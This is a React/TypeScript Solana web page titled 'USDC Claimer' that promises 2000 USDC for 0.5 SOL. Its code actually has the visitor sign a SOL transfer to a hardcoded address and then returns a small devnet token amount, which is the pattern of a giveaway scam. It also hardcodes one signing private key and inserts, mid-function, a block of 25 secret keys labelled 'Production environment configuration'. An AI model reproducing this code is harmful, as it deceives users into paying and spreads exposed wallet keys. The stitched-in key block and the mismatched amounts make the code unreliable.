/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4rCXPAujqKny3j8uVrGCZwUp5t4nvPchwdbV4qV2kDVvBTjaNCoH2XLRCoWzS8puYsZG8q9d46xhNG5KD5jDb76e"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "31RfpC7PWRVgnNEfDjbs2nVrghfEJoqxbnE7seWufuyWynebWj4ffnEu3UBn2hk3rgwso2NjFC9o1QH1DKM1QojL",
  "key1": "4SkWA38Vd1Z258gQyAtRL7d6osg7xNzsgwWcasvqp9xRLTfZcupVs5o1aLmSsSpDBP9KQmTTXnbE6m4C4gbuDfLZ",
  "key2": "221Dks4mYRH76v8w3i3XAWUAFzBHE8y3Hpr5V8mBx8uRARmp3Nwap9rJF98c21awAYGVoqHoq1zUXgRXKqj8J5Qm",
  "key3": "5QQSD3HGPV8guPPuuWSqCFNc7LsGHPRPaVguinhTEFWiSL6nZ24vzMn9GSyRhBsAYfeXKHEfGXksfHUqctwWXAqt",
  "key4": "5p4m3kWNoh5QhqWsvp38JkzBtc6SgsVdUBP95Noe3SxoH52sLHVQz6tgWXXePwzippaCtVC91E25s2sCdBjwfJ6u",
  "key5": "3UA2SqRJqtu3M4b4QBxzknaCmc5N5m135BRKEnmpJfeBVdBZ6Kbhs5q7JD6pHfTAdxzDkPf6QBz4JF5mTamwpa8h",
  "key6": "2qwWNozCLg5ruMbhCovjSmgQFrfbx5cAJo1WhWR1gV9RzKtMrnH4m5CHiUS1YoGFNYzEsx3QPyED4qFym1WoewBv",
  "key7": "3YkED1ZavvsSAsXpqqSrAYSkDCzmxfDwnNb8UZPd7V3G3bg6kGhxPWVMmQGJRRPUyotLM4DQ4ckDm7kYjtnMFqYe",
  "key8": "45QmqSTKfnzSpRx9MgJ9adFrJEP871DuS2SXEFhPw1xUNeFF4w9ZH2vRoWXqVV77WLQUn8QUQD2XV2feM83WbDPR",
  "key9": "2UymcX8PHmrhxJhW7uqmz83BrHDa2aH1imahnmTEKN859CFM1zAUjtKevetrexSRdQ7R2s4LKRcZqQQnMnjDFZG4",
  "key10": "5E8eEiLpt4wYKLiQN3Wp181TGot9iNsdEXfkQRivk5d42CRBjW3DhR6MUR9iUJa1PT7Zs8iUZL8jegxCWFXywJEe",
  "key11": "3kB6dCy45zSu1CNciS5RHqGyU4KhWENr13gX9KFRKQNEqJGPsLJJrGB9hCedDfDCPygVC9dT5uBCrHTfLUbU11Ci",
  "key12": "miDkigC83sNaCbsS4iqWRvr64thvKp66mHayA7YVCmzhQpGkro9yiTCp4KNcJD7qH2FouotgtKfCnTF3duWVucf",
  "key13": "5hBVdxxKtwCLpf3bzq2zR2Afjk162QuaHnzGKViczLWkFGHCf4gNyU91aXLJ1r5BWrUUFR9hVV8Qo8qBrPXF4PGW",
  "key14": "CPxCeq8d7BKzbfHTkRnAT2bFDPWn7PhaLkw7XbW6L5YEsnJBB6c2it4UmAd1v3ed58W7WPynFxpxBgV5pfTV7M5",
  "key15": "4jAeQ4cZVBrbFzT3VNk4cSt3jF1NrKHMKL6qQigu89w2NwVHBiRVmB25v4ZAqZHRRy2cpQwMNWT6ZP5uSXXxLHrX",
  "key16": "nDjQrjcu5YVZW32SuS3sjek6NYnFsLV3CPskU4UGjf9B5WjfMpm8QniKvkoojyDAAdLdV2KmBe3r5Cab98wtmA7",
  "key17": "5G3BcKP4C3VGKDSvDaGdep75DAE9dhp2VmRqGBHWPx6mS6Rcyy14ZCrPvWu9gQaCJzPmiNyUTESfeGxYUyiZdwJn",
  "key18": "2XAMucZEQBD3uyG6EqfUcZCiLWwmoG4dmRQMqYUVbs5nuCpdx8B8BC4ns6hY4HfaYfUJDt3DWTFtW9vjYc6R1nEv",
  "key19": "5EGdyRNYuk55xcHmp2xtDwRHikXX8p5Gy7RUsvnU7GmpDjyZxnBMLqrNP5ZesMMtGk4vGrqxPbKQTb9TTCMTDoNb",
  "key20": "4rJ9HAMcoD2mfYsYHbStCPcB69963kWjTZajuyoqNLEUAEduRGt1dTswpq55rmUuvkwbP5UbYACd21YmLZ2WgHfQ",
  "key21": "24H4je7X5DpdX7HcjEnZyYQFiPW8ZQmg9kc8fNDtBd4p4zFjJyjb6LekTbFFSx1X17RqMUFtJVxQbFnZx3Q8tmiT",
  "key22": "G2o66KvvtnEPovxJ1gzoXP4KBfcrC9ZiRy8bAA29oAMraEm3a7umSvELaKxzUzJvR17cWUqCrF7RsNdrXCKgYDM",
  "key23": "5xzuSB5Bu1G9q4uZfArYzp22ACAt6Jkc5y24WjSVPFGcGLDQzfwxPgTUunmqrxQ8LCcNseycPJZgQtrHuiucWHKj",
  "key24": "Fpsaz1sBz6bLPupx4UUZacW2uAHQZL8bEVSrshftHj1G2ykx9vkCD8LbMSX9V194Ujbduo5XJPd9FDSqfQV6TMX"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
